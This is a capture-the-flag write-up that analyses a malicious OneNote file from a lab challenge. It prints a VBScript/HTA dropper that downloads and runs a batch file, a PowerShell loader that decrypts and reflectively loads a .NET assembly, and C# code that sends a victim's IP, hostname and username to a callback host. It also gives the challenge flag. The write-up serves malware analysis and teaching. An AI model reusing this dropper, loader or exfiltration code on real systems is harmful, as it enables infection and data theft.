# On The Rescue Challenge Writeup by Om Honrao

## Challenge Description

```
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what's going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).
```

## Attachments

Contains Docker instance which gets a file called [relicmaps.one](./relicmaps.one)

## Solution

For this chall as i said no attachment was provided but a docker instance that led to a file which i already mentioned. I started with `file` command but it was data file so i ran `binwalk` and this is the result:
```bash
$ binwalk --dd ".*" relicmaps.one

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
10388         0x2894          PNG image, 1422 x 900, 8-bit/color RGBA, non-interlaced
10924         0x2AAC          Zlib compressed data, best compression
47215         0xB86F          HTML document header
48865         0xBEE1          HTML document footer
50084         0xC3A4          PNG image, 32 x 32, 8-bit/color RGBA, non-interlaced
50636         0xC5CC          PNG image, 440 x 66, 8-bit/color RGB, non-interlaced
50727         0xC627          Zlib compressed data, compressed
```
So we have a PNG image and a Zlib compressed data. I extracted the PNG image and opened it in `gimp` and it was a map of some city. I tried to zoom in but it was not clear but one wierd thing i noticed that it had HTML data too which binwalk did not extract..Hmm its wierd where did the HTML code go? I tried strings on it and this was when i found the malware which was in HTML code itself as follows:

```html
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
<script type="text/vbscript">
' Exec process using WMI
Function WmiExec(cmdLine ) 
    Dim objConfig 
    Dim objProcess 
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function
Private Function dukpatek(myObjP , myObjC , myCmdL ) 
    Dim procId 
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
	    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub
' Exec process using WScript.Shell (asynchronous)
Sub WscriptExec(cmdLine )
    CreateObject("WScript.Shell").Run cmdLine, 0
End Sub
Sub ExecuteCmdAsync(targetPath )
    On Error Resume Next
    Err.Clear
    wimResult = WmiExec(targetPath)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        WscriptExec targetPath
    End If
    On Error Goto 0
End Sub
window.resizeTo 0,0
AutoOpen
Close
</script>
</head>
<body>
</body>
</html>"
```
Fetching topsecret-maps.one seems like a dead end, but windows.bat is interesting so i downloaded it instead of topsecret-maps.one and am not including it here because no use of it so anyways lets move ahead.

I saw that .bat file and it contains :
```ps1
@echo off
set "eFlP=set "
%eFlP%"ualBOGvshk=ws"
%eFlP%"PxzdwcSExs= /"
%eFlP%"ndjtYQuanY=po"
%eFlP%"cHFmSnCqnE=Wi"
%eFlP%"CJnGNBkyYp=co"
%eFlP%"jaXcJXQMrV=rS"
...
:: SEWD/RSJz4q93dq1c+u3tVcKPbLfn1fTrwl01pkHX3+NzcJ42N+ZgqbF+h+S76xsuroW3DDJ50IxTV/PbQICDVPjPCV3DYvCc244F7AFWphPY3kRy+618kpRSK2jW9RRcOnj8dOuDyeLwHfnBbkGgLE4KoSttWBplznkmb1l50KEFUavXv9ScKbGilo9+85NRKfafzpZjkMhwaCuzbuGZ1+5s9CdUwvo3znUpgmPX7S8K4+uS3SvQNh5iPNBdZHmyfZ9SbSATnsXlP757ockUsZTEdltSce4ZWF1779G6RjtKJcK4yrHGpRIZFYJ3pLosmm7d+SewKQu1vGJwcdLYuHOkdm5mglTyp20x7rDNCxobvCug4Smyrbs8XgS3R4jHMeUl7gdbyV/eTu0bQAMJnIql2pEU/dW0krE90nlgr3tbtitxw3p5nUP9hRYZLLMPOwJ12yNENS7Ics1ciqYh78ZWJiotAd4DEmAjr8zU4U...
...
%CJnGNBkyYp%%UBndSzFkbH%%ujJtlzSIGW%%nwIWiBzpbz%%cHFmSnCqnE%%kTEDvsZUvn%%JBRccySrUq%%ZqjBENExAX%%XBucLtReBQ%%BFTOQBPCju%%vlwWETKcZH%%NCtxqhhPqI%%GOPdPuwuLd%%YcnfCLfyyS%%JPfTcZlwxJ%%ualBOGvshk%%xprVJLooVF%%cIqyYRJWbQ%%jaXcJXQMrV%%pMrovuxjjq%%KXASGLJNCX%%XzrrbwrpmM%%VCWZpprcdE%%tzMKflzfvX%%ndjtYQuanY%%chXxviaBCr%%tHJYExMHlP%%WmUoySsDby%%UrPeBlCopW%%lYCdEGtlPA%%eNOycQnIZD%%PxzdwcSExs%%VxroDYJQKR%%zhNAugCrcK%%XUpMhOyyHB%%OOOxFGwzUd%
cls
%dzPrbmmccE%%xQseEVnPet%
%eDhTebXJLa%%vShQyqnqqU%%KsuJogdoiJ%%uVLEiIUjzw%%SJsEzuInUY%%gNELMMjyFY%%XIAbFAgCIP%%weRTbbZPjT%%yQujDHraSv%%zwDBykiqZZ%%nfEeCcWKKK%%MtoMzhoqyY%%igJmqZApvQ%%SIQjFslpHA%%KHqiJghRbq%%WSRbQhwrOC%%BGoTReCegg%%WYJXnBQBDj%%SIneUaQPty%%WTAeYdswqF%%  
```
Hmm seems obfuscated i made few scripts to decode it and i had to do some manual stuff so i ain't including the script but yeah i got the following code which is more readable:
```ps1
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe

cls
cd %~dp0
%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine)

foreach ($YiLGW in $eIfqq) { 
	if ($YiLGW.StartsWith(':: ')) {  
		$VuGcO = $YiLGW.Substring(3)
 		break
 	}
}

$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO)
$BacUA = New-Object System.Security.Cryptography.AesManaged
$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC
$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=')
$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==')
$Nlgap = $BacUA.CreateDecryptor()
$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length)
$Nlgap.Dispose()
$BacUA.Dispose()
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm)
$bTMLk = New-Object System.IO.MemoryStream
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress)
$NVPbn.CopyTo($bTMLk)
$NVPbn.Dispose()
$mNKMr.Dispose()
$bTMLk.Dispose()
$uZOcm = $bTMLk.ToArray()
$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm)
$PtfdQ = $gDBNO.EntryPoint
$PtfdQ.Invoke($null, (, [string[]] ('%*')))
```
While some obfuscation remains (reversed function names) the script is well understandable. It basically copies powershell to the local folder and renames the exe to match the scripts name.

After that the script reads itself and scans for a line that starts with ':: '. This is the encrypted payload.

Then the payload gets decrypted and decompressed. The key and `iv` for `AES` decryption is provided as base64 decoded string. In the last step an assembly instance is created and invoked.

If PowerShell is at hand we can extract the payload with the script (after removing the invocation of the payload of course). Otherwise a small python script can do the same thing ( i used python):

```python
import base64
from Crypto.Cipher import AES
import gzip

with open("payload") as file:
    lines = file.readlines()

key = base64.b64decode("0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=")
iv = base64.b64decode("2hn/J717js1MwdbbqMn7Lw==")
payload = base64.b64decode(lines[0])

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(payload)
decompressed = gzip.decompress(payload)

with open("payload.decrypted", "wb") as out:
    out.write(decompressed)
```
The payload is a base64 encoded string that gets decrypted and decompressed. The result is a PE file that can be executed but ofc we don't run it :skull:..

```bash
$ file payload
payload: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```
This can quickly be decompiled with ILSpy.

```ps1
private static void Main(string[] args)
{
	IPAddress iPAddress = Dns.GetHostAddresses(Dns.GetHostName()).FirstOrDefault((IPAddress ip) => ip.AddressFamily == AddressFamily.InterNetwork);
	string machineName = Environment.MachineName;
	string userName = Environment.UserName;
	DateTime now = DateTime.Now;
	string text = "HTB{0neN0Te?_iT'5_4_tr4P!}";
	string s = $"i={iPAddress}&n={machineName}&u={userName}&t={now}&f={text}";
	Aes aes = Aes.Create("AES");
	aes.Mode = CipherMode.CBC;
	aes.Key = Convert.FromBase64String("B63PbsPUm3dMyO03Cc2lYNT2oUNbzIHBNc5LM5Epp6I=");
	aes.IV = Convert.FromBase64String("dgB58uwgaohVelj4Xhs7RQ==");
	aes.Padding = PaddingMode.PKCS7;
	ICryptoTransform cryptoTransform = aes.CreateEncryptor();
	byte[] bytes = Encoding.UTF8.GetBytes(s);
	string text2 = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	Console.WriteLine(text2);
	HttpClient httpClient = new HttpClient();
	HttpRequestMessage httpRequestMessage = new HttpRequestMessage
	{
		RequestUri = new Uri("http://relicmaps.htb/callback"),
		Method = HttpMethod.Post,
		Content = new StringContent(text2, Encoding.UTF8, "application/json")
	};
	Console.WriteLine(httpRequestMessage);
	HttpResponseMessage result = httpClient.SendAsync(httpRequestMessage).Result;
	Console.WriteLine(result.StatusCode);
	Console.WriteLine(result.Content.ReadAsStringAsync().Result);
}
```

Reading through that it seems invoking the script would have called back to relicmaps.htb with some user information. Apart from that the flag is ready for capture!

## Flag
```
HTB{0neN0Te?_iT'5_4_tr4P!}
```

## Contact info

This challenge was solved by Om Honrao (Discord ID: Inv1s1bl3#7047). If you have any questions or feedback, feel free to reach out to me.